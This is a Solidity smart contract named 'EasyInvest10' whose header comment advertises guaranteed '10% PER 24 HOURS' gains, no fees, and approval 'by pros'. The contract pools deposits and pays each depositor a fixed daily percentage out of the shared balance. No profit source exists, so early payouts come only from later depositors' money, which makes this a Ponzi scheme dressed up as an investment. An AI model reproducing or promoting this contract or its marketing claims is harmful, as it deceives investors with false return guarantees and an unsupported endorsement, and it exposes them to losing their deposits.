1 pragma solidity ^0.4.24;
2 
3 /**
4  * 
5  *
6  * ___     ___     ___   __   __            ___    _  _   __   __   ___     ___    _____              _       __   
7   | __|   /   \   / __|  \ \ / /    o O O  |_ _|  | \| |  \ \ / /  | __|   / __|  |_   _|    o O O   / |     /  \  
8   | _|    | - |   \__ \   \ V /    o        | |   | .` |   \ V /   | _|    \__ \    | |     o        | |    | () | 
9   |___|   |_|_|   |___/   _|_|_   TS__[O]  |___|  |_|\_|   _\_/_   |___|   |___/   _|_|_   TS__[O]  _|_|_   _\__/  
10 _|"""""|_|"""""|_|"""""|_| """ | {======|_|"""""|_|"""""|_| """"|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""| 
11 "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-' 
12 
13  * https://easyinvest10.app
14  * 
15  * Easy Investment Contract
16  *  - GAIN 10% PER 24 HOURS! (every 5900 blocks)
17  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
18  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
19  *
20  * How to use:
21  *  1. Send any amount of ether to make an investment
22  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
23  *  OR
24  *  2b. Send more ether to reinvest AND get your profit at the same time
25  *
26  * RECOMMENDED GAS LIMIT: 70000
27  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
28  *
29  * Contract reviewed and approved by pros!
30  *
31  */
32 contract EasyInvest10 {
33     // records amounts invested
34     mapping (address => uint256) public invested;
35     // records blocks at which investments were made
36     mapping (address => uint256) public atBlock;
37 
38     // this function called every time anyone sends a transaction to this contract
39     function () external payable {
40         // if sender (aka YOU) is invested more than 0 ether
41         if (invested[msg.sender] != 0) {
42             // calculate profit amount as such:
43             // amount = (amount invested) * 10% * (blocks since last transaction) / 5900
44             // 5900 is an average block count per day produced by Ethereum blockchain
45             uint256 amount = invested[msg.sender] /10 * (block.number - atBlock[msg.sender]) / 5900;
46 
47             // send calculated amount of ether directly to sender (aka YOU)
48             msg.sender.transfer(amount);
49         }
50 
51         // record block number and invested amount (msg.value) of this transaction
52         atBlock[msg.sender] = block.number;
53         invested[msg.sender] += msg.value;
54     }
55 }